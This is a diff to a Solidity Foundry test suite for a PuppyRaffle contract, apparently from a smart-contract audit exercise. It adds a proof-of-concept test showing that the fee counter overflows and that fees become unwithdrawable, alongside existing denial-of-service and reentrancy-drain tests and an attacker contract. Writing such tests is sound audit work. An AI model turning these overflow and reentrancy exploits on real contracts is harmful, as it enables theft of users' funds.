@@ -214,6 +214,47 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 
+    /////////////////////////////////////
+    /// Test Integer Overflow     ///
+    ////////////////////////////////////
+function testTotalFeesOverflow() public playersEntered {
+        // We finish a raffle of 4 to collect some fees
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 startingTotalFees = puppyRaffle.totalFees();
+        // startingTotalFees = 800000000000000000
+
+        // We then have 89 players enter a new raffle
+        uint256 playersNum = 89;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        // We end the raffle
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // And here is where the issue occurs
+        // We will now have fewer fees even though we just finished a second raffle
+        puppyRaffle.selectWinner();
+
+        uint256 endingTotalFees = puppyRaffle.totalFees();
+        console.log("ending total fees", endingTotalFees);
+        assert(endingTotalFees < startingTotalFees);
+
+        // We are also unable to withdraw any fees because of the require check
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+
+
+
+    /////////////////////////////////////
+    /// Test Denial of Service       ///
+    ////////////////////////////////////
     function test_DoS() public {
         vm.txGasPrice(1);
         // Let's try to enter 100 players;
@@ -248,7 +289,9 @@ contract PuppyRaffleTest is Test {
         assert(gasUsedFirst < gasUsedSecond);
         }
 
-        
+     /////////////////////////////////////
+    /// Test Reentrancy               ///
+    ////////////////////////////////////
     function testReentrance() public playersEntered {
         ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
         vm.deal(address(attacker), 1e18);
@@ -263,7 +306,6 @@ contract PuppyRaffleTest is Test {
         assertEq(endingContractBalance, 0);
 }
 }
-
 
 contract ReentrancyAttacker {
     PuppyRaffle puppyRaffle;
@@ -290,4 +332,3 @@ contract ReentrancyAttacker {
     }
 }
 
-   
